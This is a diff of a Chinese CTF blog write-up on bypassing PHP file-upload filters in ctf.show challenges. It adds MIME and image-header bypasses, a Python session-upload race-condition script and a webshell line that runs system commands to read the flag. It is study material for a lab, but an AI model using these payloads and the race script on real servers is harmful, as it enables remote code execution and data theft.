@@ -19,19 +19,27 @@
   <meta name="author" content="MaskObito">
   <meta name="keywords" content="">
   
-    <meta name="description" content="文件上传1.只是前端校验，可通过在前端修改后缀 2.后端单一校验，可通过抓包改后缀不改文件类型  若存在后端校验，同样上传jpg，只改前端无法绕过。   (不在同一目录下可用tac  ..&#x2F;flag.php) web153 .user.ini 的作用：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。 核心指令：auto_prepend_file（在PHP文件前包含">
+    <meta name="description" content="文件上传1.只是前端校验，可通过在前端修改后缀 2.后端单一校验，可通过抓包改后缀不改文件类型  若存在后端校验，同样上传jpg，只改前端无法绕过。   (不在同一目录下可用tac  ..&#x2F;flag.php) 3.mine检测，需要改content-type 1if($_FILES[&#x27;file&#x27;][&#x27;type&#x27;] &#x3D;&#x3D; &#x27;image&#x2F;pn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传">
 <meta property="og:url" content="http://maskobito.github.io/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="MaskObito">
-<meta property="og:description" content="文件上传1.只是前端校验，可通过在前端修改后缀 2.后端单一校验，可通过抓包改后缀不改文件类型  若存在后端校验，同样上传jpg，只改前端无法绕过。   (不在同一目录下可用tac  ..&#x2F;flag.php) web153 .user.ini 的作用：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。 核心指令：auto_prepend_file（在PHP文件前包含">
+<meta property="og:description" content="文件上传1.只是前端校验，可通过在前端修改后缀 2.后端单一校验，可通过抓包改后缀不改文件类型  若存在后端校验，同样上传jpg，只改前端无法绕过。   (不在同一目录下可用tac  ..&#x2F;flag.php) 3.mine检测，需要改content-type 1if($_FILES[&#x27;file&#x27;][&#x27;type&#x27;] &#x3D;&#x3D; &#x27;image&#x2F;pn">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://maskobito.github.io/images/9a762f47-2287-47f7-b391-096b379b28aa.png">
 <meta property="og:image" content="http://maskobito.github.io/images/eddc040ccdda087f6262057a63c5bdbe.png">
 <meta property="og:image" content="http://maskobito.github.io/images/5a90eab4cca48291f96c1dfc3cab70f3.png">
+<meta property="og:image" content="http://maskobito.github.io/images/cf231c4e-e5be-46f2-9bd3-0532c3a4be09.png">
+<meta property="og:image" content="http://maskobito.github.io/images/69e99a6f-e224-4357-9282-b2bec9b360b1.png">
 <meta property="og:image" content="http://maskobito.github.io/images/02a295ad4b5f52df2811e78b3dc63672.png">
+<meta property="og:image" content="http://maskobito.github.io/images/0f8e0b29-fee8-434b-98c1-849ff859e21b.png">
+<meta property="og:image" content="http://maskobito.github.io/images/52f22e53866051c2e73ef58809f8a8e9.png">
+<meta property="og:image" content="http://maskobito.github.io/images/881f5bde9c030408a38679a8351a72f6.png">
+<meta property="og:image" content="http://maskobito.github.io/images/d6bc3eb2d69dbdebc785f2755e4b9a93.png">
+<meta property="og:image" content="http://maskobito.github.io/images/c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2.png">
+<meta property="og:image" content="http://maskobito.github.io/images/82338ce0-fff8-45b5-a0c9-5314553b8ce8.png">
 <meta property="article:published_time" content="2025-05-06T13:40:11.000Z">
-<meta property="article:modified_time" content="2025-08-31T13:35:33.504Z">
+<meta property="article:modified_time" content="2025-09-10T11:46:53.497Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://maskobito.github.io/images/9a762f47-2287-47f7-b391-096b379b28aa.png">
@@ -231,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          1.8k 字
         
       </span>
     
@@ -242,7 +250,7 @@
         
         
         
-          12 分钟
+          16 分钟
         
       </span>
     
@@ -291,6 +299,13 @@
 <p><img src="/../images/eddc040ccdda087f6262057a63c5bdbe.png" srcset="/img/loading.gif" lazyload alt="eddc040ccdda087f6262057a63c5bdbe"></p>
 <p><img src="/../images/5a90eab4cca48291f96c1dfc3cab70f3.png" srcset="/img/loading.gif" lazyload alt="5a90eab4cca48291f96c1dfc3cab70f3"></p>
 <p>(不在同一目录下可用tac  ..&#x2F;flag.php)</p>
+<p>3.mine检测，需要改content-type</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>)&#123;<br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/../images/cf231c4e-e5be-46f2-9bd3-0532c3a4be09.png" srcset="/img/loading.gif" lazyload alt="cf231c4e-e5be-46f2-9bd3-0532c3a4be09"></p>
+<p>失败</p>
+<p><img src="/../images/69e99a6f-e224-4357-9282-b2bec9b360b1.png" srcset="/img/loading.gif" lazyload alt="69e99a6f-e224-4357-9282-b2bec9b360b1"></p>
 <h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><ul>
 <li><strong>.user.ini 的作用</strong>：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。</li>
 <li><strong>核心指令</strong>：<code>auto_prepend_file</code>（在PHP文件<strong>前</strong>包含）和 <code>auto_append_file</code>（在PHP文件<strong>后</strong>包含）。</li>
@@ -360,6 +375,37 @@
 <p>这段代码。</p>
 <p>直接连接即可</p>
 <p>注意：include后不可加空格，前后引号保持一致。</p>
+<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>有真正的图片验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br></code></pre></td></tr></table></figure>
+
+<p>bp上传时会检测文件头，加上GIF89a即可</p>
+<p><img src="/../images/0f8e0b29-fee8-434b-98c1-849ff859e21b.png" srcset="/img/loading.gif" lazyload alt="0f8e0b29-fee8-434b-98c1-849ff859e21b"></p>
+<h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><p>过滤了.</p>
+<p>因为\x2e要想被解析成.得在字符串里面使用，只能换方法</p>
+<h4 id="法一：session条件竞争"><a href="#法一：session条件竞争" class="headerlink" title="法一：session条件竞争"></a>法一：session条件竞争</h4><p>因为没办法用. 想到session在临时目录下不需要.  php中唯一能控制的无后缀的只有session文件</p>
+<p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p>
+<p>因为<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>上传完成后，会清空session中的内容，所以要利用条件竞争，不断上传，不断访问</p>
+<p>先正常上传user.ini</p>
+<p><img src="/../images/52f22e53866051c2e73ef58809f8a8e9.png" srcset="/img/loading.gif" lazyload alt="52f22e53866051c2e73ef58809f8a8e9"></p>
+<p>上传文件，名字为1</p>
+<p><img src="/../images/881f5bde9c030408a38679a8351a72f6.png" srcset="/img/loading.gif" lazyload alt="881f5bde9c030408a38679a8351a72f6"></p>
+<p>写条件竞争脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> re<br><br>session = requests.session()<br>sess = <span class="hljs-string">&#x27;abc&#x27;</span>  <span class="hljs-comment"># 之前上传时自拟的名字，对应图片内容中的sess_abc</span><br>url1 = <span class="hljs-string">&quot;http://58245caf-77db-4386-8f04-3a3536cfed7f.challenge.ctf.show&quot;</span>  <span class="hljs-comment"># 注意修改</span><br>url2 = <span class="hljs-string">&quot;http://58245caf-77db-4386-8f04-3a3536cfed7f.challenge.ctf.show/upload&quot;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>  <span class="hljs-comment"># 文件名，随便改就行</span><br>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>():  <span class="hljs-comment"># 上传文件竞争过程</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.post(url1, data=data1, files=file, cookies=cookies)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 每次竞争完都访问一下url/upload看有没有flag</span><br>        r = session.get(url2)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>)  <span class="hljs-comment"># flag格式匹配</span><br>            <span class="hljs-built_in">print</span>(flag.findall(r.text))<br><br><br>threads = [threading.Thread(target=write),<br>           threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br></code></pre></td></tr></table></figure>
+
+<p>稍等片刻得到flag</p>
+<p><img src="/../images/d6bc3eb2d69dbdebc785f2755e4b9a93.png" srcset="/img/loading.gif" lazyload alt="d6bc3eb2d69dbdebc785f2755e4b9a93"></p>
+<p>法二：</p>
+<p>新建文件abc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat ../f*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>ip转数字：795762179</p>
+<p>官网：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://www.bejson.com/convert/ip2int/<br></code></pre></td></tr></table></figure>
+
+<p>先上传ini包含文件</p>
+<p><img src="/../images/c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2.png" srcset="/img/loading.gif" lazyload alt="c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2"></p>
+<p>再上传远程调用文件 txt</p>
+<p><img src="/../images/82338ce0-fff8-45b5-a0c9-5314553b8ce8.png" srcset="/img/loading.gif" lazyload alt="82338ce0-fff8-45b5-a0c9-5314553b8ce8"></p>
 
                 
               </div>
@@ -422,9 +468,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/05/13/ISCC2025/" title="ISCC2025">
+                      <a href="/2025/05/08/CTF-SSRF/" title="CTF-SSRF">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ISCC2025</span>
+                        <span class="hidden-mobile">CTF-SSRF</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
